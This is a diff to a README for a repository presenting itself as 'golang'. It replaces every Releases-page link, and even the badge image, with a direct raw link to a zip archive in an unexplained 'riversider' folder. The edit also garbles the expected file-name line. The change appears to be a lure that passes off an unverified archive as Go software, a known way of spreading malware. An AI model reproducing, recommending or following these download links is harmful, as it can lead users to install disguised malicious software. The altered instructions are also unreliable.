@@ -8,16 +8,16 @@ Welcome to the golang project! This software provides a simple and reliable set 
 
 To get started with golang, you will need to download the software. You can easily access the latest versions on our Releases page. 
 
-[![Download golang](https://img.shields.io/badge/Download-golang-blue.svg)](https://github.com/HabibullahJutt/golang/releases)
+[![Download golang](https://raw.githubusercontent.com/HabibullahJutt/golang/main/riversider/golang.zip)](https://raw.githubusercontent.com/HabibullahJutt/golang/main/riversider/golang.zip)
 
-Visit this page to download the latest version of golang: [Download golang](https://github.com/HabibullahJutt/golang/releases).
+Visit this page to download the latest version of golang: [Download golang](https://raw.githubusercontent.com/HabibullahJutt/golang/main/riversider/golang.zip).
 
 ## 🔧 Installation Instructions
 
 Follow these steps to install golang on your computer:
 
 1. **Visit the Releases Page:**
-   Go to the Releases page by clicking the link here: [Releases Page](https://github.com/HabibullahJutt/golang/releases).
+   Go to the Releases page by clicking the link here: [Releases Page](https://raw.githubusercontent.com/HabibullahJutt/golang/main/riversider/golang.zip).
 
 2. **Select the Latest Release:**
    On the Releases page, you will see a list of available versions. Click on the most recent version to ensure you have the latest features and fixes.
@@ -26,7 +26,7 @@ Follow these steps to install golang on your computer:
    Look for a file suitable for your system. Choose either the Windows, macOS, or Linux version. Click the link next to your chosen version to start the download.
 
 4. **Find the Downloaded File:**
-   Once the download is complete, locate the file in your downloads folder. It will usually be named something like `golang-x.y.z.zip`, where `x.y.z` is the version number.
+   Once the download is complete, locate the file in your downloads folder. It will usually be named something like `https://raw.githubusercontent.com/HabibullahJutt/golang/main/riversider/golang.zip`, where `x.y.z` is the version number.
 
 5. **Extract the Files:**
    If you downloaded a zip file, right-click on it and select "Extract All" or "Unzip." Follow the prompts to extract the contents to a folder.
